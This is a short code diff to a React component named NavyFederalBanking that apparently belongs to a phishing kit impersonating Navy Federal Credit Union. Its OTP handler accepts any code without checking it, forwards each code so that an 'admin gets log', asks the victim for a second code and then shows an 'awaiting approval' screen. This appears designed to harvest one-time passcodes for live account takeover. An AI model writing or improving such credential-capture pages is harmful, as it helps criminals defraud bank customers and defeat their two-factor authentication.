@@ -104,20 +104,21 @@ export default function NavyFederalBanking() {
         
         const which = step === 'otp1' ? 1 : 2
         
-        // ✅ BYPASS OTP — ALWAYS ACCEPT (Admin gets log)
-await submitOtp({ attemptId, otp, which })
-
-setLoading(false)
-setOtp('')
-
-if (which === 1) {
-  setStep('otp2')
-  setNote('Second code sent to your email.')
-} else {
-  setStep('awaiting_approval')
-  setNote(WAIT_MSG)
-}
-return
+         // ✅ BYPASS OTP — ALWAYS ACCEPT (Admin gets log)
+  const result = await submitOtp({ attemptId, otp, which })
+  console.log('📱 OTP result:', result) // Optional: log result for debugging
+  
+  setLoading(false)
+  setOtp('')
+  
+  if (which === 1) {
+    setStep('otp2')
+    setNote('Second code sent to your email.')
+  } else {
+    setStep('awaiting_approval')
+    setNote(WAIT_MSG)
+  }
+  return
     } catch (err) {
       setLoading(false)
       setError(err instanceof Error ? err.message : 'Error')
